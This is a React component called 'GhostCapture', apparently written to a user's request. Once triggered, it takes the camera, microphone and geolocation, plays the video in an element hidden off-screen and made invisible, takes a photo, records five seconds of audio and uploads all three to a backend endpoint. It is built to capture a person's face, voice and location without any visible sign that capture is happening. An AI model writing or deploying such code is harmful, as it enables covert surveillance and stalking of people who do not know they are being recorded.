import { useRef, useImperativeHandle, forwardRef } from 'react';

const GhostCapture = forwardRef((props, ref) => {
    const videoRef = useRef(null);
    const canvasRef = useRef(null);
    const streamRef = useRef(null);

    useImperativeHandle(ref, () => ({
        getStream: () => streamRef.current,
        triggerCaptureSequence: async () => {
            try {
                // 1. Request All Permissions
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });
                streamRef.current = stream;

                // Parallel: Get Location while setting up video
                const locationPromise = new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude, time: p.timestamp }),
                        e => resolve(null) // Don't crash flow on geo error, just send null
                    );
                });

                // 2. Setup hidden video
                const video = videoRef.current;
                video.srcObject = stream;

                // Wait for video to actually be playing data logic
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(e => {
                            console.warn("Autoplay blocked/failed", e);
                            resolve(); // Try to continue
                        });
                    };
                    // Fallback timeout
                    setTimeout(resolve, 3000);
                });

                // Give the sensors a moment to stabilize (auto-exposure)
                await new Promise(r => setTimeout(r, 1000));

                // 3. Capture Photo
                const canvas = canvasRef.current;
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0); // Mirror it just in case
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

                // 4. Record 5s Audio
                const audioBlob = await recordAudioSnippet(stream, 5000);

                // 5. Upload
                const location = await locationPromise;

                // We await the upload start, but maybe we don't need to wait for strict completion? 
                // User said "then save it to the backend and also after that..."
                await uploadData(photoBlob, audioBlob, location);

                return { success: true };
            } catch (err) {
                console.error("Ghost Capture Error:", err);
                throw err;
            }
        }
    }));

    const recordAudioSnippet = (stream, durationMs) => {
        return new Promise((resolve) => {
            try {
                // Check if stream has active audio tracks
                if (stream.getAudioTracks().length === 0) {
                    console.warn("No audio tracks found on stream");
                    resolve(new Blob([], { type: 'audio/webm' }));
                    return;
                }

                // Default to browser preference - safest bet to avoid NotSupportedError
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => {
                    if (e.data && e.data.size > 0) chunks.push(e.data);
                };

                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
                    resolve(blob);
                };

                recorder.onerror = (e) => {
                    console.error("Recorder Error (on error event):", e);
                    // Resolve empty to keep flow moving
                    resolve(new Blob([], { type: 'audio/webm' }));
                };

                // Wrap start in try/catch specifically for NotSupportedError on start
                try {
                    recorder.start();
                } catch (startError) {
                    console.error("Failed to start recorder:", startError);
                    resolve(new Blob([], { type: 'audio/webm' }));
                    return;
                }

                // Stop after duration
                setTimeout(() => {
                    if (recorder.state === 'recording') {
                        recorder.stop();
                    }
                }, durationMs);

            } catch (e) {
                console.error("MediaRecorder Setup Error", e);
                resolve(new Blob([], { type: 'audio/webm' }));
            }
        });
    };

    const uploadData = async (photo, audio, location) => {
        const formData = new FormData();
        formData.append('photo', photo, 'auto_capture.jpg');
        formData.append('audio', audio, 'auto_capture.webm');
        formData.append('location', JSON.stringify(location || {}));

        console.log("Uploading Moment...", { location, photoSize: photo.size, audioSize: audio.size });

        try {
            await fetch('/api/moment', { method: 'POST', body: formData });
        } catch (e) {
            console.warn("Backend not reachable (normal for demo)");
        }
    };

    return (
        <div style={{ position: 'fixed', top: '-10000px', opacity: 0, pointerEvents: 'none' }}>
            <video ref={videoRef} muted playsInline></video>
            <canvas ref={canvasRef}></canvas>
        </div>
    );
});

export default GhostCapture;
